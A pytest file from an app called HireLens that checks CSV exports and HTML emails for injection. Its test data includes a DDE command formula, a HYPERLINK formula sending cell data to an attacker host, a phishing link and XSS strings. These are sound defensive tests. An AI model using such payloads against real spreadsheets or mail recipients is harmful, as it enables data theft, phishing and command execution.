"""
HireLens — output-injection tests (CSV and email)
Run: cd backend && python -m pytest tests/unit/test_output_injection.py -v

Both of these are the same shape: data a stranger controls leaves the system
inside a document someone else opens, and the receiving program treats part
of it as instructions rather than text.

This app is unusually exposed to it. Its entire input is documents uploaded
by people who are not users — candidates — and its entire output is reports,
spreadsheets and emails consumed by recruiters and by other candidates. The
attacker writes the resume; the victim opens the export.

CSV: a cell beginning with = + - or @ is a FORMULA to Excel and Google
Sheets, so an exported ranking is executable. `=HYPERLINK("https://attacker/"&A1)`
in a candidate name leaks the surrounding pipeline; older Excel extends this
to command execution through DDE.

EMAIL: `team_name` is user-authored and went into the invite template
unescaped, so a team could be named into a link — turning HireLens's own
sending domain and branding into a phishing delivery mechanism.
"""

import html

import pytest

from app.core.csv_safety import csv_safe, csv_safe_row


class TestCsvFormulaInjection:
    @pytest.mark.parametrize(
        "payload",
        [
            "=cmd|'/c calc'!A1",
            "+1+1",
            "-1+1",
            "@SUM(A1:A9)",
            '=HYPERLINK("https://attacker.example/"&A1,"Open")',
            "\tleading tab",
            "\rleading carriage return",
        ],
    )
    def test_formula_payloads_are_neutralised(self, payload):
        out = csv_safe(payload)
        assert out.startswith("'"), f"{payload!r} would still evaluate as a formula"
        # The recruiter must still be able to read the original value.
        assert payload in out

    def test_ordinary_values_are_left_alone(self):
        for value in ["Ada Lovelace", "resume.pdf", "recommended", "88", ""]:
            assert csv_safe(value) == value

    def test_none_becomes_an_empty_cell(self):
        assert csv_safe(None) == ""

    def test_numbers_pass_through_as_text(self):
        assert csv_safe(88) == "88"
        assert csv_safe(0) == "0"

    def test_row_helper_covers_every_cell(self):
        row = csv_safe_row(["=evil()", "ok", None, 5, "@also_evil"])
        assert row[0].startswith("'")
        assert row[1] == "ok"
        assert row[2] == ""
        assert row[3] == "5"
        assert row[4].startswith("'")


class TestEveryCsvExportUsesIt:
    """A guard applied to two of three exports is not a guard.

    Checked against the source because driving all three endpoints needs a
    live database and a completed batch; the property being protected is
    "no writerow in this app takes raw values", which a new export added
    later should also have to satisfy.
    """

    @pytest.mark.parametrize(
        "module_path",
        [
            "app.api.v1.endpoints.reports",
            "app.api.v1.endpoints.bulk",
            "app.api.v1.endpoints.match",
        ],
    )
    def test_data_rows_go_through_csv_safe_row(self, module_path):
        import importlib
        import inspect
        import re

        src = inspect.getsource(importlib.import_module(module_path))

        # Header rows are literal strings written by us and need no guard;
        # anything else must be wrapped.
        for match in re.finditer(r"writer\.writerow\(\s*(.{0,40})", src, re.S):
            snippet = match.group(1)
            # A header row is a list of literal strings we wrote ourselves and
            # needs no guard. Detect it after collapsing whitespace, since the
            # list may open on its own line.
            after_bracket = snippet.lstrip().lstrip("[").lstrip()
            if after_bracket.startswith('"'):
                continue
            assert "csv_safe_row" in snippet, (
                f"{module_path}: a writerow call writes unescaped values — "
                f"candidate names and filenames come from uploaded documents"
            )


class TestEmailHtmlInjection:
    @pytest.mark.asyncio
    async def test_a_team_name_cannot_inject_markup_into_an_invite(self, monkeypatch):
        """The phishing case: HireLens's domain, the attacker's link."""
        from app.services.email import sender

        captured = {}

        async def fake_send(to_email, subject, html_content, text_fallback):
            captured["html"] = html_content
            captured["text"] = text_fallback
            return True

        monkeypatch.setattr(sender, "send_raw_email", fake_send)

        payload = '"><a href="https://phish.example">Verify your account</a><b x="'
        await sender.send_team_invite_email(
            to_email="victim@example.com",
            team_name=payload,
            inviter_name="Attacker",
            invite_url="https://app.example.com/signup",
        )

        body = captured["html"]
        assert "phish.example" not in body or "&quot;" in body
        assert '<a href="https://phish.example">' not in body
        # The name is still readable, just inert.
        assert html.escape(payload) in body

    @pytest.mark.asyncio
    async def test_an_inviter_name_cannot_inject_markup(self, monkeypatch):
        from app.services.email import sender

        captured = {}

        async def fake_send(to_email, subject, html_content, text_fallback):
            captured["html"] = html_content
            return True

        monkeypatch.setattr(sender, "send_raw_email", fake_send)

        await sender.send_team_invite_email(
            to_email="victim@example.com",
            team_name="Engineering",
            inviter_name="<script>alert(1)</script>",
            invite_url="https://app.example.com/signup",
        )

        assert "<script>" not in captured["html"]

    @pytest.mark.asyncio
    async def test_candidate_email_body_is_escaped_not_just_newline_converted(self, monkeypatch):
        """The variable here was literally named `safe_body_html` and escaped
        nothing. A recruiter writing "range < 100k" also lost everything after
        the "<" to a half-parsed tag."""
        from app.services.email import sender

        captured = {}

        async def fake_send(to_email, subject, html_content, text_fallback):
            captured["html"] = html_content
            return True

        monkeypatch.setattr(sender, "send_raw_email", fake_send)

        await sender.send_candidate_decision_email(
            "candidate@example.com",
            "Update",
            "Hi,\nsalary range < 100k & benefits\n<img src=x onerror=alert(1)>",
        )

        body = captured["html"]
        assert "<img" not in body
        assert "&lt;img" in body
        assert "&amp;" in body
        # Newlines still become line breaks.
        assert "<br>" in body

    def test_templates_use_the_current_design_tokens(self):
        """The emails styled themselves with the indigo/emoji system the UI
        moved away from, so a recipient got a message that did not look like
        the product they had just used."""
        from app.services.email import sender

        import asyncio

        captured = {}

        async def fake_send(to_email, subject, html_content, text_fallback):
            captured["html"] = html_content
            return True

        original = sender.send_raw_email
        sender.send_raw_email = fake_send
        try:
            asyncio.run(
                sender.send_team_invite_email(
                    to_email="a@b.com",
                    team_name="Engineering",
                    inviter_name="Ada",
                    invite_url="https://app.example.com/signup",
                )
            )
        finally:
            sender.send_raw_email = original

        body = captured["html"]
        assert "#3B7D78" in body  # petrol teal brand
        assert "#6366F1" not in body  # old indigo
        assert "#0B0F17" not in body  # old near-black background
        assert "🔎" not in body
